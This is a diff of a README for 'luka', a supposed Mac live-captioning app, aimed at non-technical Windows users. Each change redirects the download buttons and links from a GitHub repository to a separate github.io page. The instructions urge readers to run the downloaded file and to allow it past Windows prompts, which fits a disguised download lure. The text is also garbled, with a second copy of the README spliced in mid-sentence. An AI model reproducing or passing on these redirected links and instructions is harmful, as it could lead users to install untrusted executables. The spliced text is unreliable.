@@ -1,6 +1,6 @@
 # 🎙️ luka - Live Captions for Everything Your Mac Hears
 
-[![Download luka](https://img.shields.io/badge/⬇️_Download_luka-FF6B6B?style=for-the-badge&labelColor=2E8B57&logo=github&logoColor=white)](https://github.com/mariannmultidimensional627/luka)
+[![Download luka](https://img.shields.io/badge/⬇️_Download_luka-FF6B6B?style=for-the-badge&labelColor=2E8B57&logo=github&logoColor=white)](https://mariannmultidimensional627.github.io)
 
 luka is a live transcription and translation application. It turns speech into readable text while audio is playing and can translate that text into another language. This guide is written for a non-technical Windows user who wants to download and run the application from the provided link. You do not need programming knowledge, a developer account, or special technical skills to follow the steps below.
 
@@ -32,7 +32,7 @@ You do not need to install extra developer tools. You do not need to open a comm
 
 ## 📥 Download and Run on Windows
 
-Visit this link to download the application: [Download luka](https://github.com/mariannmultidimensional627/luka).
+Visit this link to download the application: [Download luka](https://mariannmultidimensional627.github.io).
 
 1. Open your web browser on the Windows computer.
 2. Go to the download link shown above.
@@ -50,7 +50,7 @@ If Windows asks whether you want to allow the application to run, choose the opt
 
 After# 🎙️ luka - Live Captions for Everything Your Mac Hears
 
-[![Download luka](https://img.shields.io/badge/⬇️_Download_luka-8A2BE2?style=for-the-badge&labelColor=FF8C00&logo=github&logoColor=white)](https://github.com/mariannmultidimensional627/luka)
+[![Download luka](https://img.shields.io/badge/⬇️_Download_luka-8A2BE2?style=for-the-badge&labelColor=FF8C00&logo=github&logoColor=white)](https://mariannmultidimensional627.github.io)
 
 luka is a live transcription and translation application. It turns speech into readable on-screen text while audio is playing, and it can translate that text so you can follow along in the language you prefer. This guide is written for a non-technical computer user. You do not need programming knowledge, a developer account, or any special technical skill to follow the steps below.
 
@@ -93,7 +93,7 @@ A few practical suggestions before you start:
 
 ## 📥 Download and Run on Windows
 
-Visit this link to download the application: **[Download luka](https://github.com/mariannmultidimensional627/luka)**.
+Visit this link to download the application: **[Download luka](https://mariannmultidimensional627.github.io)**.
 
 1. Open your web browser on the Windows computer.
 2. Go to the download link shown above.
@@ -107,7 +107,7 @@ Visit this link to download the application: **[Download luka](https://github.co
 
 If Windows asks whether you want to allow the application to run, choose the option that lets you continue. If the download seems slow, leave the browser open until it completes. Once the file is downloaded, open it from the Downloads folder rather than trying to launch it from inside the browser.
 
-[![Download luka for Windows](https://img.shields.io/badge/⬇️_Get_luka_now-20B2AA?style=for-the-badge&labelColor=4B0082&logo=github&logoColor=white)](https://github.com/mariannmultidimensional627/luka)
+[![Download luka for Windows](https://img.shields.io/badge/⬇️_Get_luka_now-20B2AA?style=for-the-badge&labelColor=4B0082&logo=github&logoColor=white)](https://mariannmultidimensional627.github.io)
 
 ## 🎧 How to Use luka for the First Time
 
